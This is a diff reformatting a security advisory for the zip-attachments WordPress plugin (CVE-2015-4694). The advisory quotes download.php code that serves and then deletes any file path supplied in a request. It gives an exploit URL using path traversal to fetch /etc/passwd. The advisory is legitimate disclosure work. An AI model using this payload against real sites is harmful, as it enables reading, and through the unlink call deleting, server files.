@@ -1,28 +1,34 @@
+
                                Advisory #: 126
-Title: zip-attachments v1.1.4 wordpress plugin arbitrary file download
-vulnerability
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-06-10
-Download Site: https://wordpress.org/plugins/zip-attachments/
-Vendor:Rick Torres
-Vendor Notified: 2015-06-11
-Vendor Contact: @ricard_dev
-Description: Simple and lightweight plugin to add a "Download" button to your
-posts, pages or custom post types.
-Vulnerability:
-zip-attachments allows arbitrary file downloads because it doesn't check the
-download path of the requested file. In zip-attachments/download.php, there is
-no check to see if the file is outside of the intended download path: 8 if
-(isset($_REQUEST['za_file']) && !empty($_REQUEST['za_file'])){ 9 10 $file =
-$_GET['za_file']; 11 $filename = $_GET['za_filename']; 12 13 header('Content-
-Type: application/zip'); 14 header('Content-Length: ' . filesize($file)); 15
-header('Content-Disposition: attachment; filename="'.$filename.'.zip"'); 16 17
-readfile($file); 18 unlink($file); Any file readable by the httpd process can
-be downloaded.
-CVE-2015-4694
-JSON:Export
-Exploit Code:
-   1. http://www.example.com/wp-content/plugins/zip-attachments/
-      download.php?za_file=../../../../../etc/passwd&za_filename=passwd
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisory.php?v=126
+
+   Title: zip-attachments v1.1.4 wordpress plugin arbitrary file download
+   vulnerability
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-06-10
+   Download Site: https://wordpress.org/plugins/zip-attachments/
+   Vendor: Rick Torres
+   Vendor Notified: 2015-06-11
+   Vendor Contact: @ricard_dev
+   Description: Simple and lightweight plugin to add a "Download" button
+   to your posts, pages or custom post types.
+   Vulnerability:
+   zip-attachments allows arbitrary file downloads because it doesn't
+   check the download path of the requested file. In
+   zip-attachments/download.php, there is no check to see if the file is
+   outside of the intended download path: 8 if(isset($_REQUEST['za_file'])
+   && !empty($_REQUEST['za_file'])){ 9 10 $file = $_GET['za_file']; 11
+   $filename = $_GET['za_filename']; 12 13 header('Content-Type:
+   application/zip'); 14 header('Content-Length: ' . filesize($file)); 15
+   header('Content-Disposition: attachment;
+   filename="'.$filename.'.zip"'); 16 17 readfile($file); 18
+   unlink($file); Any file readable by the httpd process can be
+   downloaded.
+   CVE-2015-4694
+   JSON: Export
+   Exploit Code:
+
+    1. http://www.example.com/wp-content/plugins/zip-attachments/download.
+       php?za_file=../../../../../etc/passwd&za_filename=passwd
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisory.php?v=126
